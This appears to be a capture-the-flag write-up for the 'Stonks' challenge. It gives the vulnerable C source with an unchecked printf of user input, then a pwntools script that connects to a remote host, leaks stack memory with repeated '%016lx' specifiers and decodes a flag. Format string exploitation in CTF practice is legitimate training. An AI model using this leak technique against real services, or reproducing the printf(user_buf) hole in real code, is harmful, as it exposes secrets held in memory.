# Stonks

## Reverse Analysis

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks
{
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios
{
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p)
{
	if (!p)
	{
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date");
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head)
	{
		printf("You don't own any stonks!\n");
	}
	while (head)
	{
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares)
{
	if (shares < 1)
	{
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++)
	{
		if (i < AI_symbol_len)
		{
			stonk->symbol[i] = 'A' + (rand() % 26);
		}
		else
		{
			stonk->symbol[i] = '\0';
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p)
{
	if (!p)
	{
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api", "r");
	if (!f)
	{
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0)
	{
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");


	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
    // XXXX: here we have a format string vulnerability

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio()
{
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p)
{
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current)
	{
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p)
	{
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1)
	{
		buy_stonks(p);
	}
	else if (resp == 2)
	{
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}
```

## Vulnerability

The vulnerability in this code is a format string vulnerability in the `buy_stonks` function. The line:

```c
printf(user_buf);
```


## Exploit

Use 50 `%016lx` to leak it and decode it, remember to reverse every 4 characters because of the little endian.

```python
#!/usr/bin/python3

from pwn import *

context.log_level = "debug"

r = remote("124.16.75.117", 51008)

r.sendlineafter("View my portfolio", b"1")
format_string = b"%016lx."
r.sendlineafter("What is your API token?", format_string * 50)
text = r.recvuntil("Portfolio")
text = text.decode("utf-8")[27:]
text = text.replace("Portfolio", "")
text = text.split(".")

text_processed = ""
for item in text:
    # Decode every byte to char
    if len(item) == 16:
        try:
            item = int(item, 16)
            item = item.to_bytes(8, "big")
            item = item.decode("utf-8")
            text_processed += item
        except (ValueError, UnicodeDecodeError):
            pass

print(text_processed)

# Split by 4 characters and reverse every group
reversed_text = "".join(
    text_processed[i : i + 8][::-1] for i in range(0, len(text_processed), 8)
)

print(reversed_text)
r.interactive()
```
